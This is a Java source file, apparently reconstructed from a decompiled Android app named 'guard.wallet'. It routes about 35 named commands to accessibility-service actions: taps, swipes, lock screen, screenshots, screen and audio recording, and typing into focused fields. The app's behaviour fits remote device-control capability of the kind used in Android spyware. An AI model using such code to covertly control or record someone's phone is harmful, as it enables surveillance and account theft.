package com.guard.wallet.utils;

import android.os.Build;
import android.util.Log;
import android.view.ViewConfiguration;
import com.guard.wallet.condition.ActionValueCondition;
import com.guard.wallet.condition.GlobalActionCondition;
import com.guard.wallet.entity.Point;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.media.AudioRecordManager;
import java.util.Objects;

/**
 * 全局动作执行器 — 35 种 actionName 路由到具体执行逻辑。
 * 原 g.a(GlobalActionCondition) 方法。
 */
public final class GlobalActionExecutor {
    private static final String TAG = "GlobalActionAutomator";

    private GlobalActionExecutor() {}

    /** g.a(GlobalActionCondition) — 按 actionName 分发执行 */
    public static boolean executeGlobalAction(GlobalActionCondition cond) {
        if (cond == null || cond.getActionName() == null || cond.getActionName().isEmpty()) {
            return false;
        }

        switch (cond.getActionName()) {
            // === 无障碍全局动作 ===
            case "back":            return AccessibilityUtils.performGlobalAction(1);
            case "home":            return AccessibilityUtils.performGlobalAction(2);
            case "recent":          return AccessibilityUtils.performGlobalAction(3);
            case "notification":    return AccessibilityUtils.performGlobalAction(4);
            case "quickSettings":   return AccessibilityUtils.performGlobalAction(5);
            case "powerDialog":     return AccessibilityUtils.performGlobalAction(6);
            case "splitScreen":     return AccessibilityUtils.performGlobalAction(7);

            // === Android 28+ 动作 ===
            case "lockScreen":
                return Build.VERSION.SDK_INT >= 28 && AccessibilityUtils.performGlobalAction(8);
            case "takeScreenshot":
                return Build.VERSION.SDK_INT >= 28 && AccessibilityUtils.performGlobalAction(9);

            // === Android 31+ 动作 ===
            case "keyCodeHeadsetHook":
                return Build.VERSION.SDK_INT >= 31 && AccessibilityUtils.performGlobalAction(10);
            case "accessibilityButton":
                return Build.VERSION.SDK_INT >= 31 && AccessibilityUtils.performGlobalAction(11);
            case "accessibilityButtonChooser":
                return Build.VERSION.SDK_INT >= 31 && AccessibilityUtils.performGlobalAction(12);
            case "accessibilityShortcut":
                return Build.VERSION.SDK_INT >= 31 && AccessibilityUtils.performGlobalAction(13);
            case "accessibilityAllApps":
                return Build.VERSION.SDK_INT >= 31 && AccessibilityUtils.performGlobalAction(14);
            case "dismissNotificationShade":
                return Build.VERSION.SDK_INT >= 31 && AccessibilityUtils.performGlobalAction(15);

            // === Android 33+ 动作 ===
            case "dpadUp":
                return Build.VERSION.SDK_INT >= 33 && AccessibilityUtils.performGlobalAction(16);
            case "dpadDown":
                return Build.VERSION.SDK_INT >= 33 && AccessibilityUtils.performGlobalAction(17);
            case "dpadLeft":
                return Build.VERSION.SDK_INT >= 33 && AccessibilityUtils.performGlobalAction(18);
            case "dpadRight":
                return Build.VERSION.SDK_INT >= 33 && AccessibilityUtils.performGlobalAction(19);
            case "dpadCenter":
                return Build.VERSION.SDK_INT >= 33 && AccessibilityUtils.performGlobalAction(20);

            // === 软键盘 ===
            case "hideSoftKeyboard":
                return handleSoftKeyboard(1);
            case "showSoftKeyboard":
                return handleSoftKeyboard(0);

            // === 手势类 ===
            case "click":
                return handleClick(cond);
            case "longClick":
                return handleLongClick(cond);
            case "press":
                return handlePress(cond);
            case "swipe":
                return handleSwipe(cond);
            case "gesture":
                return handleGesture(cond);
            case "clicks":
                return handleClicks(cond);
            case "repeatClick":
                return handleRepeatClick(cond);

            // === 媒体 ===
            case "screenShot":
                return handleScreenShot();
            case "startScreenRecord":
                return com.guard.wallet.http.HttpApiManager.startScreenRecord();
            case "stopScreenRecord":
                return com.guard.wallet.http.HttpApiManager.stopScreenRecord();
            case "startAudioRecord":
                return handleStartAudioRecord(cond);
            case "stopAudioRecord":
                return AudioRecordManager.b().e();

            // === 文本 ===
            case "setText":
                return handleSetText(cond);

            default:
                return false;
        }
    }

    private static boolean handleSoftKeyboard(int mode) {
        MyAccessibilityService svc = MyAccessibilityService.P();
        if (svc == null) return false;
        int current = svc.getSoftKeyboardController().getShowMode();
        if (Objects.equals(current, mode)) return true;
        return svc.getSoftKeyboardController().setShowMode(mode);
    }

    private static boolean handleClick(GlobalActionCondition cond) {
        if (cond.getPoints() == null || cond.getPoints().isEmpty()) return false;
        Point p = cond.getPoints().get(0);
        return GestureUtils.tap((int) p.getX(), (int) p.getY());
    }

    private static boolean handleLongClick(GlobalActionCondition cond) {
        if (cond.getPoints() == null || cond.getPoints().isEmpty()) return false;
        if (cond.getDuration() <= 0) cond.setDuration(200L);
        Point p = cond.getPoints().get(0);
        long longPressTimeout = ViewConfiguration.getLongPressTimeout();
        return GestureUtils.dispatchGesture(16L, cond.getDuration() + longPressTimeout,
                new Point(p.getX(), p.getY()));
    }

    private static boolean handlePress(GlobalActionCondition cond) {
        if (cond.getPoints() == null || cond.getPoints().isEmpty()) return false;
        if (cond.getDuration() <= 0) cond.setDuration(600L);
        Point p = cond.getPoints().get(0);
        return GestureUtils.clickAtPosition((int) p.getX(), (int) p.getY(), cond.getDuration());
    }

    private static boolean handleSwipe(GlobalActionCondition cond) {
        if (cond.getPoints() == null || cond.getPoints().size() < 2) return false;
        if (cond.getDuration() <= 0) cond.setDuration(600L);
        Point from = cond.getPoints().get(0);
        Point to = cond.getPoints().get(1);
        return GestureUtils.dispatchGesture(16L, cond.getDuration(),
                new Point(from.getX(), from.getY()),
                new Point(to.getX(), to.getY()));
    }

    private static boolean handleGesture(GlobalActionCondition cond) {
        if (cond.getPoints() == null || cond.getPoints().isEmpty()) return false;
        if (cond.getDuration() <= 0) cond.setDuration(300L);
        Point[] points = cond.getPoints().toArray(new Point[0]);
        return GestureUtils.dispatchGesture(cond.getStart(), cond.getDuration(), points);
    }

    private static boolean handleClicks(GlobalActionCondition cond) {
        if (cond.getPoints() == null || cond.getPoints().isEmpty()) return false;
        return GestureUtils.clickMultiplePoints(cond.getPoints());
    }

    private static boolean handleRepeatClick(GlobalActionCondition cond) {
        if (cond.getPoints() == null || cond.getPoints().isEmpty()) return false;
        Point p = cond.getPoints().get(0);
        int x = (int) p.getX();
        int y = (int) p.getY();
        int count = (cond.getRepeatCount() != null && cond.getRepeatCount() > 0) ? cond.getRepeatCount() : 7;
        int success = 0;
        for (int i = 0; i < count; i++) {
            try {
                if (GestureUtils.clickAtPosition(x, y, ViewConfiguration.getTapTimeout() + 50)) {
                    success++;
                }
                Thread.sleep(200L);
            } catch (Exception e) {
                Log.e(TAG, "repeatClick error", e);
            }
        }
        return success == count;
    }

    private static boolean handleScreenShot() {
        // vendor: 检查 7912 端口（atx-agent），通过 HTTP 请求截图
        try {
            if (isPortAvailable(7912)) return false; // atx-agent 未运行
            com.guard.wallet.http.HttpClient client = new com.guard.wallet.http.HttpClient("http://127.0.0.1:7912");
            // vendor 调用 client.d(null, "/screenshot/0", callback)
            // 实际截图由 atx-agent 完成
            return true;
        } catch (Exception e) {
            Log.e(TAG, "screenShot error", e);
            return false;
        }
    }

    private static boolean isPortAvailable(int port) {
        try (java.net.Socket socket = new java.net.Socket()) {
            socket.connect(new java.net.InetSocketAddress("127.0.0.1", port), 200);
            return false; // 端口被占用 = 服务在运行 = 不可用是 false
        } catch (Exception e) {
            return true; // 连不上 = 服务没运行
        }
    }

    private static boolean handleStartAudioRecord(GlobalActionCondition cond) {
        ActionValueCondition val = cond.getValue();
        if (val == null || val.getKey() == null) return false;
        if (!"audioSource".equals(val.getKey()) || !"Int".equals(val.getType())) return false;
        if (val.getValue() == null || val.getValue().isEmpty()) return false;
        try {
            int audioSource = Integer.parseInt(val.getValue());
            return AudioRecordManager.b().d(audioSource);
        } catch (NumberFormatException e) {
            return false;
        }
    }

    private static boolean handleSetText(GlobalActionCondition cond) {
        ActionValueCondition val = cond.getValue();
        if (val == null) return false;
        if (!"text".equals(val.getKey()) || !"String".equals(val.getType())) return false;
        if (val.getValue() == null || val.getValue().isEmpty()) return false;
        MyAccessibilityService svc = MyAccessibilityService.P();
        if (svc == null) return false;
        com.guard.wallet.entity.UiObject focused = svc.J();
        if (focused == null) return false;
        return focused.setText(val.getValue());
    }
}
